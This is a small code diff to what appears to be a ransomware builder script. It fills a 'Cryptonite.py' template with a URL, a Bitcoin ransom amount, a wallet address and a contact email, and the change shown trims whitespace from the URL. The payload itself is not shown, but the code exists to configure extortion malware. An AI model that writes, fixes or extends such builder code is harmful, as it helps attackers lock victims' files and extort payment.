@@ -38,7 +38,7 @@ def generate():
     }
     with open("Cryptonite.py", "r") as f:
         text = f.read()
-        text = text.replace("URL = \"\"", f"URL = \"{configDict['URL']}\"")
+        text = text.replace("URL = \"\"", f"URL = \"{configDict['URL'].strip()}\"")
         text = text.replace("BTC_AMOUNT = \"\"", f"BTC_AMOUNT = \"{configDict['BTC_AMOUNT']}\"")
         text = text.replace("BTC_WALLET = \"\"", f"BTC_WALLET = \"{configDict['BTC_WALLET']}\"")
         text = text.replace("EMAIL = \"\"", f"EMAIL = \"{configDict['EMAIL']}\"")
